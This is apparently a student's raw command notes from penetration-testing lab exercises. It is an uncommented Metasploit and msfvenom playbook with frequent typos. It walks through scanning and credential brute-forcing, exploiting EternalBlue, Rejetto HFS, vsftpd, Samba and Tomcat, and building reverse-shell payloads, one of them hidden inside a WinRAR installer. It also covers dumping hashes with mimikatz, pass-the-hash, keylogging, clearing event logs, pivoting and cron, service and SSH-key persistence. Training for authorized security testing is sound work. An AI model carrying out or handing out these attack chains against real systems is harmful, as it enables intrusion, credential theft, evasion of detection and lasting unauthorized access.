**The Metasploit Framework (MSF)**
```
msfconsole
show all
show exploit
show -h
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.32.45
show options
set PORTS 1-1000
run
back
search -h
search cve:2017 type:exploit platform:-windows
search eternalblue
show options
sessions
connect -h
connect 192.168.32.3 80


db_status
workspace -h
workspace
hosts
workspace -a Astro
workspace default
workspace -d Astro
workspace -r Astro jasee


Port Scanning & Enumeration With Nmap

nmap  -Pn 10.43.2.1

nmap -sV -O -p- -Pn 10.43.2.1 -oX Windows_server_2012
service postgresql start && msfconsole
db_status
workspace -a windows_server_2012
db_import /root/windows_server_2012
hosts
services
db_nmap -Pn -sV -O 10.43.32.2
vulns

port Scanning With Auxiliary Modules
get meterpreter sessions
and network route
ifconfig
service postgresql start && msfconsole
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 10.2.32.3
run
curl 10.2.32.3
search xoda
use exploit/unix/wabapp/xoda_file_upload
set RHOSTS 10.2.32.3
set TARGETURI /
show options
exploit
sysinfo
shell
/bin/bash -i
ifconfig
ctrl+C
run autoroute -s 192.113.124.2
background
sessions
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.113.124.3
show options
exploit

back
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 192.83.130.3






FTP Enumeration

service postgresql start && msfconsole
workspace -a FTP_enum
search portscan
use auxiliary/scanner/portscan/tcp
set RHOTS 192.162.23.3
run
back
search ftp
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_version
show options
set RHOSTS 192.162.23.3
run
search ProFTPD
back
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_login
show options
set RHOSTS 192.162.23.3
show options
set USER_FILE /usr/share/metasploit-framework/data/workdlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlist/unix_password.txt
exploit
show options
ftp
ftp 192.162.23.3 #service down
back
exit
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/anonymous
show options

set RHOSTS 192.162.23.3
run
exit

ftp 192.162.23.3
sysadmin
password
ls
get secret.txt
exit
cat secret.txt



SMB Enumeration

service postgresql start && msfconsole
workspace -a smb enum
setg RHOSTS 192.168.34.3
search smb
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
show options
run
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumusers
info
run
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumshares
show options
set ShowFiles ture
run

search smb_login
use auxiliary/scanner/smb/smb_login
show options
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
exit
smbclient -L \\\\192.162.45.3\\ -U admin
password
smbclient  \\\\192.162.45.3\\public -U admin   #share name is public

ls
cd secret
get flag
exit
cat flag
smbclient  \\\\192.162.45.3\\aisha -U admin 



Web Server Enumeration
ifconfig
service postgresql start && msfconsole
workspace -a web_enum
setg RHOSTS 192.168.45.3
setg RHOST 192.168.45.3
search http
search type:auxiliary name:http
use auxiliary/scanner/http/http_version
show options
run
searc http_header
show options
run
search robots_txt
use auxiliary/scanner/http/robots_txt
show options
run
curl 192.140.160.3/data/
curl 192.140.160.3/secure/
search dir_scanner
use auxiliary/scanner/http/dir_scanner
run
search file_dir
use auxiliary/scanner/http/files_dir
run
search http_login
use auxiliary/scanner/http/http_login
show options
set AUTH_URI /secure
unset USERPASS_FILE
run
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_password.txt
run
show options
set VERSBOSE false
run
ctrl+c
search apache_userdir_enum
use auxiliary/scanner/http/apache_userdir_enum
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/
run
search http_login
use auxiliary/scanner/http/http_login
show options
echo "rooty" >user.txt
set USER_FILE /root/user.txt
run
set VERBOSE true



MySQL Enumeration

ifconfig
192.168.34.3

service postgresql start && msfconsole
workspace -a Mysql_enum
setg RHOSTS 192.168.34.3
setg RHOST 192.168.34.3
search type:auxiliary name:myslq
use auxiliary/scanner/mysql/mysql_version
run
show options
search portscan
use auxiliary/scanner/postscan/tcp
show options
run
search mysql_login
use auxiliary/scanner/mysql/mysql_login
show options
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlist/unix_password.txt
set VERBOSE false
run
search mysql_enum
use auxiliary/admin/mysql/mysql_enum
info
set PASSWORD twinkle
set USERNAME root
run
search mysql_sql
use auxiliary/admin/mysql_sql
show options
set PASSWORD twinkle
set USERNAME root
run
show options
set SQL show databases;
run
set SQL use videos;
search myql_schema
use auxiliary/scanner/mysql/mysql_schemadump
show options
set PASSWORD twinkle
set USERNAME root
run
hosts
services
loot
creds
mysql -h 192.168.23.3 -u root -p
show databases;
use videos;
show tables;



SSH Enumeration

service postgresql start && msfconsole
workspace -a SSH_Enum
setg RHOSTS 192.168.34.3
set RHOST 192.168.34.3
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_version
run
search openssh
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_login
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlist/common_usrs.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlist/common_passwords.txt
run
sessions
sessions 1
/bin/bash -i
exit
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_eumusers
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlist/common_usrs.txt
run


SMTP Enumeration

service postgresql start && msfconsole
workspace -a SMPT_Enum
setg RHOSTS 192.168.34.3
search type:auxiliary name:smtp
use auxiliary/scanner/smtp/smtp_version
show options
run
search type:auxiliary name:smtp
use auxiliary/scanner/smtp/smtp_enum
info
run


Vulnerability Scanning With MSF

sudo nmap -sn 10.10.10.1/24
ip a s
service postgresql start && msfconsole
db_status
setg RHOSTS 10.10.10.4
setg RHOST 10.10.10.4
workspace -a web
db_nmap -sS -sV -O 10.10.10.4
hosts
services
search type:exploit name:Microsoft IIS
search type:exploit name:MySQL 5.5
search Sun GlassFish
use exploit/multi/http/glassfish_deployer
info
set payload windows/meterpterter/reverse_tcp
show options
services
back
servicess
searchsploit "Microsoft Winows SMB"
searchsploit "Microsoft Winows SMB" | grep -e "Metasploit"
search ethernalblue
use auxiliary/scanner/smb/smb_ms17_010
show options
run
use exploit/windows/smb/ms17_010_ethernalblue
show options
run
sysinfo
exit
back
github  >> hahwul/metasploit-autopwn
cd Download
wget https://raw.git.....
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
msf6 > load db_autopwn
db_autopwn
db_autopwn -p -t 
db_autopwn -p -t  -PI 445
analyze
vulns
services
searchsploit "Apache Tomcat/Coyota JSP engine"


Vulnerability Scanning With Nessues

sudo systemctl start nessusd.service
sudo systemctl status nessusd.service
msfconsole
workspace -a nessues
db_impot /home/kali/Download/ms3_.ness
hosts
services
vulns
vulns -p 445
search cve:2017 name:smb
search cve:2012 name:rdp
search MS12-020
search cve:2015 name:ManageEngine
sessions
sessions 1
back
search cve:2019 name:rdp




Web App Vulnerability Scanning With WMAP

ifconfig
service postgresql start && msfconsole
workspace -a WMAP
setg RHOSTS 192.168.34.3
load wmap
wmap_  +tab bar
wmap_sites -a 192.168.34.3
wmap_targets -h
wmap_tatgets -t http://192.168.34.3/
wmap_sites -l
wmap_tagets -l
wmap_run -h
wmap_run -t
wmap_run -e
wmap_vulns -h
wmap_vulns -l
use auxiliary/scanner/http/options
show options
run
use auxiliary/scanner/http/http_put
show options
run
set PATH /data/
run
curl http://192.157.89.3:80/data/msf_http_put_test.txt
show options
set FILEDATA "This does Work"
set FILENAME this_work.txt
Run


Generating Payloads With Msfvenom

msfvenom
msfvenom --list payloads

msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.34.3 LPORT=1234 -f  exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe

cd Desktop/windows_payload/

msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.34.3 LPORT=1234 -f  exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe

msfvenom --list formmats

msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.34.3 LPORT=1234 -f  elf > /home/kali/Desktop/Windows_Payloads/payloadx86

sudo python -m SimpleHTTPServer 80

new tab
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 10.10.10.5.
set LPORT 1234 
run
set payload linux/x86/meterpreter/reverse_tcp
Run


Encoding Payloads With Msfvenom

msfvenom --list encoders

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LHOST=1234 -e x86/shikata_ga_nai 
-f exe > ~/Desktop/encoderdx86.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LHOST=1234 -i 10 -e x86/shikata_ga_nai 
-f exe > ~/Desktop/encoderdx86.exe

msfvenom -p linux/meterpreter/reverse_tcp LHOST=10.10.10.5 LHOST=1234 -i 10 -e x86/shikata_ga_nai 
-f elf > ~/Desktop/encoderdx86.exe

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOSTS 10.10.10.5
set LPORT 1234
show options
run

sudo python -m SimpleHTTPServer 80
then run the payload


Injecting Payloads Into Windows Portable Executable

msfvenom
download  WinRAR executable file

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234
-e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/winrar.exe

sudo python -m SimpleHTTPServer 80
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5 
set LPORT 1234
run
sysinfo
run post/windows/manage/migrate
sysinfo
ls

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234
-e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/winrar.exe  # -k somtime not work



Automating Metasploit With Resource Scripts

ls -al /usr/share/metasploit-framework/sceipts/resource/

msfconsole
vim handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
:wq
msfconsole -r handler.rc
vim portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.5
run
:wq
msfconsole -r portscan.rc

vim  db_status.rc
db_status
workspace
workspace -a Test
msfconsole -r db_status.rc
msfconsole
msf6 resource ~/Desktop/wiondow_payload.rc
exporting command:>>
makerc ~/Desktop/portscan.rc


Exploiting A Vulnerable HTTP File Server
service postgresql start && msfconsole
workspace -a HFS
setg RHOSTS 10.2.24.160
db_nmap -sS -sV -O 10.2.24.160
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
info
run
sysinfo
ctrl +c
set payload windows/x64/meterpreter/reverse_tcp
show options
Run


Exploiting Windows MS13-010 SMB Vulnerability
msfconsole
workspace -a EternalBlue
db_nmap -sS -sV -O 10.10.23.3
services
search type:auxiliary EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS 10.10.10.7
run
search type:exploit EthernalBlue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.7
run
sysinfo
Getuid


Exploiting WinRM (Windows Remote Management Protocol)
service postgresql start && msfconsole
workspace -a winRM
db_nmap -sS -sV -p- -O 192.168.83.3
services
search type:auxiliary winRM
use auxiliary/scanner/winrm/winrm_auth_methods
setg RHOSTS 192.168.83.3
run
search winrm_login
use auxiliary/scanner/winrm/winrm_login
show options

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_password.txt
run
search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set UERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
run
search winrm_script
use exploit/windows/winrm/winrm_script_exec
show options
set USERNAME administrator
set PASSWORD tinkerbell
show options
set FORCE_VBS true
run
sysinfo
getuid


Exploiting A Vulnerable Apache Tomcat Web Server

service postgresql start && msfconsole
workspace -a tomcat
setg RHOSTS 10.2.120.126
db_nmap -sS -sVC -A 10.2.120.126
search type:exploit tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
show options
info
set payload java/jsp_shell_bind_tcp
show options
set SHELL cmd
run
enter
dir
getgid
whoami
ctrl+z
sessions
new tab
msfvenom -p windows/meterpreter/reverse_tcp LHOST=kaliIP LPOR=1233 -f exe >meterpreter.exe
sudo python -m SimpleHTTPServer 80
sessions 1
certutil -urlcache -f http://kaliIP/meterpreter.exe meterpreter.exe
dir

vim handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.4.5
set LPORT 1234
run
:wq
msfconsole -r handler.rc
run the file on the terget
.\meterpreter.exe
sysinfo
getuid


Exploiting A Vulnerable FTP Server

ifconfig
service postgresql start && msfconsole
workspace -a vsftp
setg RHOSTS 192.209.183.3
db_nmap -sS -sVC -O 192.209.183.3
vulns
analyze
search vsftpd
use expoit/unix/ftp/vsftpd_234_backdoor
info
run
ls
/bin/bash -i
ctrl+z
sessions
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST eth1
set SESSION 1
run
sessions
sessions 2
sysinfo
getuid

Exploiting Samba

service postgresql start && msfconsole
workspace -a samba
setg RHOSTS 192.18.76.3
db_nmap -sS -sV -O 192.18.76.3
search type:exploit name:samba
use exipoit/linux/samba/is_knonw_pipename
show options
check
info
run
ls
pwd
ctrl+z
sessions
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST eth1
set SESSION 1
run
sessons
sessions 2
sysinfo

Exploiting A Vulnerable SSH Server

ifconfig
service postgresql start && msfconsole
workspace -a libssh
setg RHOSTS 192.168.34.3
db_nmap -sS -sV -O 192.168.34.3
services
hosts
search libssh_auth_bypass
use auxiliary/scanner/ssh/libssh_auth_bypass
show options
set SPAWN_PTY true
run
sesssions
sessions 1
whoami
cat /etc/*release
uname -r
ctrl+z
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST eth1
set SESSIONS 1
run
sessions
sessions 2
sysinfo
getuid


Exploiting A Vulnerable SMTP Server

Haraka SMTP
ifconfing
service postgresql start && msfconsole
workspace -a SMTP
setg RHOSTS 192.168.8.3
setg RHOST 192.168.8.3
db_nmap -sS -sVC -O 192.168.8.3
search type:exploit name:haraka
use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test

set payload linux/x64/meterpreter_reverse_http
show options
set LHOST eth1
run
sysinfo
getuid

Meterpreter Fundamentals

ifconfig
service postgresql start && msfconsole
workspace -a msfconsole_demo
setg RHOSTS 192.168.8.3
db_nmap -sS -sVC -O 192.168.8.3
services
hosts
curl http://192.168.8.3
search xoda
use exploit/unix/webapp/xoda_file_upload
set TARGETURI /
run
sysinfo
getuid
dir
help
background
sessions
sessions -h
sessions -C sysinfo -i 1
sessions 1
background
sessions -h
sessions -k 1
sessions -l
sessions -n xoda -i 1 #(give name)
sessions 1
ls
cat flag1
edit flag1
:wq
cd "Secret Files"  # space so need to ""
cat .flag2
download flag5.zip 
ctrl+z
unzip flag5.zip
sessions 1
checksum md5 /bin/bash   ######
getenv PATH
getenv TERM
search -d /usr/bin -f *backdoor*
search -f *.jpg
search -f *.php
download flag1
back
sessions 1
shell
/bin/bash -i
ps
ctrl+c
ps 
migrate 580
migrate -N apache2
execute -f ifconfig
?

Upgrading Command Shells To Meterpreter Shells

ifconfig
service postgresql start && msfconsole
workspace -a Shells
setg RHOSTS 192.168.34.3
db_nmap -sS -sVC -O 192.168.34.3
search type:exploit samba
use exploit/linux/samba/is_known_pipename
run
ls
pwd
/bin/bash -i
back
sessions
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set SESSIONS 1
set LHOST eth1
run
sessions
sessions 2
exit
sessions
sessions -h
sessions -u 1
sessions 
sessions 3
sysinfo
getuid

Windows Post Exploitation Modules

service postgresql start && msfconsole
workspace -a window_post
setg RHOSTS 10.2.23.169
db_nmap -sVC 10.2.23.169
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
run
sysinfo
getuid
help
screenshot
getsystem
getuid
hashdump
show_mount
ps
migrate explorer
sysinfo
dir
ls
cd C:\\
cat flag.txt
pwd
downoad flag.txt
background
sessions
search upgrade platform:windows
search migrate
use post/windows/manage/migrate
show options
set SESSIOS 1
run
sessions
sessions 1
back
search win_privs
use post/widonws/gather/win_privs
set SESSIONS 1
search enum_logged_on
use post/windows/gather/enum_logged_on_users
show options
set SESSIONS 1
run
search checkvm
use post/windows/gather/checkvm
set SESSIONS 1
run
search enum_applications
use post/windows/gatehr/enum_applications
set SESSIONS 1
run
loot
search type:post platform:windows av
search type:post platform:windows enum_av
use post/windows/gatehr/enum_av_excluded
show options
set SESSIONS 1
run
search enum_computer
use post/windows/gather/enum_computers
set SESSIONS 1
search enum_patches
use post/windows/gather/enum_patches
show options
set SESSIONS 1
run
sessions
sessions 1
migrate 896  #Authority\local service
background
run
sessions 1
shell
systeminfo
ctrl+z
search enum_shares
use post/windows/gather/enum_shares
show options
set SESSIONS 1
run
search rdp 
use post/windows/manage/enable_rdp
show options
set SESSIONS 1
run

Windows Privilege Escalation: Bypassing UAC

service postgresql start && msfconsole
workspace -a UAC
setg RHOSTS 192.168.34.3
db_nmap -sS -sCV -O 192.168.34.3
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set payload windows/x64/meterpterer/reverse_tcp
run
sysinfo
getuid
getsystem
getprivs
shell
net users
net localgroup administrator
ctrl+c
sessions
search bypassuac
use exploit/windows/local/bypassuac_injection_winsxs
set payload windows/x64/meterpreter/reverse_tcp
show options
set SESSIONS 1
sessions
set LPORT 4433
run
set TARGET Windows\ x64 
run
sysinfo
getuid
getsystem
getuid
Hashdump



Windows Privilege Escalation: Token Impersonation With Incognito

service postgresql start && msfconsole
workspace -a Impersonate
setg RHOSTS 10.20.12.3
db_nmap -sS -sVC -O 10.20.12.3
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set payload windows/x64/meterpreter/reverse_tcp
show options
exploit
sysinfo
getuid
getprivs
hashdump
cd C:\\
cd Users
cd Administrator
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
hashdump
ps
migrate 3544 #explorer.exe
hashdump
cd C:\\
cd Users
cd Administrator



Dumping Hashes With Minikatz

service postgresql start && msfconsole
workspace -a Minikatz
setg RHOSTS 10.10.23.3
db_nmap -sVC -sS -O 10.10.23.3
search badblue 2.7
use exploit/windows/http/badblue_passthru
show options
set target BadBlue \ EE\ 2.7\ Universal
sysinfo
ps
getuid
pgrep lsass
migrate 792
sysinfo
load kiwi
help
creds_all
lsa_dump_sam
lsa_dump_secrets
upload /usr/share/windows-resources/binaries/
upload /usr/share/windows-reources/mimikatz/x64/mimikatz.exe
dir
shell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

Pass-The-Hash With PsExec
service postgresql start && msfconsole
workspace -a PsExec
setg RHOSTS 10.2.29.3
search badblue
use exploit/windows/http/badblue_pasthru
show options
set target BadBllue\ EE\ 2.7\ Universal
getuid
pgrep lsass
migrate 877
getuid
hashdump
save the hashdum in a file
exit sessions
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
show options
set SMBUser Administrator
set SMBPass put the administrator hash value here
exploit
sysinfo
getuid
back
sessions
set SMBUser student
set SMBpass hash value here
set LPORT 4433
exploit
sessions 2
exit


Establishing Persistence On Windows

service postgresql start && msfconsole
workspace -a Persistence
setg RHOSTS 10.20.23.3
db_nmap -sS -sVC -O 10.20.23.3
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set payload windows/x64/meterpreter/reverse_tcp
show options
exploit
sysinfo
getuid
back
search platform:windows persistence
use exploit/windows/local/persistence_service
set payload windows/x64/meterpreter/reverse_tcp
show options
set SESSIONS 1
exploit
set payload windows/meterpreter/reverse_tcp
getuid
sessions
sessions -K
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
exploit
exit
run
exit
exit
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
run


Enabling RDP

service postgresql start && msfconsole
workspace -a RDP
setg RHOSTS 10.10.34.3
db_nmap -sS -sV 10.10.34.3
search badblue
use exploit/windows/http/http_passthru
show options
set target BadBlue \ EE\ 2.7\ Universal
exploit
getuid
sysinfo
back
search enable_rdp
use post/windows/manage/enable_rdp
show options
set SESSIONS 1
exploit
db_nmap -sV -p 3389 10.10.32.3
sessions 1
shell
net users
net user administrator astro123_321
ctrl+c
net tab
xfreerdp /u:administrator /p:astro123_321 /v:10.10.32.3



Windows Keylogging

service postgresql start && msfconsole
workspace -a Keylogging
setg RHOSTS 10.10.23.3
search badblue
use exploit/windows/http/badblue_passthru
show options
set target BadBlue\ EE\ 2.7\ Universal
sysinfo
getuid
pgrep explorer
migrate 2312
help
keyscan_start
keyscan_dump
keyscan_stop
keyscan_start

Clearing Windows Event Logs

service postgresql start && msfconsole
workspace -a clear_events
setg RHOSTS 10.10.32.3
search badblue
use exploit/windows/http/badblue_passthru
set target BadBlue \ EE\ 2.7\ Universal
sysinfo
getuid
shell
net user administrator Password_123321
ctrl+c
clearev

Pivoting


service postgresql start && msfconsole
workspace -a Pivoting
Victiom Machine 1:10.2.27.1
Victiom Machine 2:10.2.27.187
ping 10.2.27.1
db_nmap -sS -sV 10.2.27.1 (V1)
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS 10.2.27.1
exploit
sysinfo
ipconfig
run autoroute -s 10.2.27.0/20
ctrl+z
sessions
sessions -h 
sessions -n victim-1 -i 1
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.2.27.187
set PORTS 1-1000
exploit
sessions 1
portfwd add -l 1234 -p 80 -r 10.2.27.187 (V2)
ctrl+z
db_nmap -sS -sV -p 1234 10.2.27.187 localhost
search badblue
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp
show options
set RHOSTS 10.2.27.187
set LPORT 4433
exploit
sysinfo
ctrl+z
sessions
sessions -n victim-2 -i 2
sessions 2
sysinfo


Linux Post Exploitation Modules
service postgresql start && msfconsole
workspace -a Linux_post
setg RHOSTS 192.168.23.3
db_nmap -sV 192.168.23.3
search type:exploit samba
use exploit/linux/samba/is_known_pipename
run
pwd
ctrl+z
sessions
sessions -u 1
sessions 2
sysinfo
shell
/bin/bash -i
whoami
cat /etc/passwd
groups root
cat /etc/*issue
uname -r
uname -a 
ip a s
ps aux
env
ctrl+c
sessions
sessions -u 1
sessions
search enum_configs
use post/linux/gather/enum_configs
show options
sessions
set SESSIONS 3
run
loot
search env platform:linux
use post/linux/gather/env
show options
set sessions 3
search enum_network
use post/linux/gather/enum_network
set SESSIONS 3
run
loot
search enum_protections
use post/linux/gather/enum_protections
info
set SESSIONS 3
run
notes
search enum_system
use post/linux/gather/enum_system
info
set SESSIONS 3
exploit
loot
search checkcontainer
use post/linux/gather/checkcontainer
show options
set SESSIONS 3
run
search checkvm
use post/linux/gather/checkvm
show options
set SESSIONS 3
run
search enum_users_history
use post/linux/gather/enu_users_history
set SESSIONS 3
run
loot


Linux Privilege Escalation: Exploiting A Vulnerable Program

service postgresql start && msfconsole
workspace -a Privilege_Escalations
setg RHOSTS 192.168.34.3
db_nmap -sS -sVC -O 192.168.34.3
search ssh_login
use auxiliary/scanner/ssh/ssh_login
set USERNAME jackie
set PASSWORD password
exploit
sessions
sessions 1
pwd
/bin/bach -i
whoami
cat /etc/*issue
ctrl+z
sessions -u 1
sessions
sysinfo
getuid
shell
/bin/bash -i
cat /etc/passwd
ps aux
cat /bin/check-down
chkrootkit --help
chkrootkit -V
ctrl+z
search chkrootkit
use exploit/unix/local/chkrootkit
show options
info
set CHKROOTKIT /bin/chkrootkit
set SESSIONS 2
set LHOST 192.168.34.3
sessions
exploit
/bin/bash -i
whoami

Dumping Hashes With Hashdump

service postgresql start && msfconsole
workspace -a Hashdump
setg RHOSTS 192.168.34.3
db_nmap -sS -sVC -O 192.168.34.3
search sampa type:exploit
use exploit/linux/samba/is_known_pipename
exploit
pwd
ctrl+z
sessions
sessions -u 1
sessions 2
sysinfo
getuid
shell
whoami
ctrl+c
sessions -u 1
sessions 
seaech hashdump
use post/linux/gather/hashdump
show options
set SESSIONS 3
run
loot
open the file useing cat
sessions 3
shell
/bin/bash -i
passwd root
give the password
useradd -m jaseelan -s /bin/bash
passwd jaseelan
ctrl+c
sessions -u 1
show options
set SESSIONS 4
run
loot
sessions 4

Establishing Persistence On Linux

service postgresql start && msfconsole
workspace -a Persistence
db_nmap -sS -sCV -O 192.168.32.3
setg RHOSTS 192.168.32.3
search ssh_login
use auxiliary/scanner/ssh/ssh_login
set USERNAME jackie
set PASSWORD password
run
sessions
sessions -u 1
sessions
search chkrootkit
use exploit/unix/local/chkrootkit
set SESSIONS 2
set CHKROOTKIT /bin/chkrootkit
exploit
show options
ifconfig
set LHOST 192.187.32.4
show options
exploit
ls
cat flag
ctrl+z
sessions
sessions -u 3
sessions
sessions 4
getuid
shell
/bin/bash -i
whoami
ctrl+z
shell
/bin/bash -i
cat /etc/passwd
useradd -m ftp -s /bin/bash
passwd ftp
password12332
cat /etc/passwd
groups root
usermod -aG root ftp
groups ftp
usermod -u 15 ftp
cat /etc/passwd
ctrl+z
search platform:linux persistence
use exploit/linux/local/apt_package_manager_persistence
show options
info
search platform:linux persistence
use exploit/linux/local/cron_persistence
show options
set SESSIONS 4
exploit
ctrl+c
sessions
set LPORT 442
set LHOST eth1
exploit
search platform:linux persistence
use exploit/linux/service_persistence
set SESSIONS 4
exploit
set payload cmd/unix/reverse_python
set LHOST 192.182.80.3
set LPORT 4433
info
set target 3
exploit
set target 4
search platform:linux persistence
use post/linux/manage/sshkey_persistence
show options
set CREATESSHFOLDER true
set SESSIONS 4
info
show options
exploit
loot
exit -y
vim ssh_key
:wq
chmod 0400 ssh_key
ssh -i ssh_key root@192.168.45.3
exit -y
ssh -i ssh_key ftp@192.168.45.3
```























































































































































































































 

























































































































































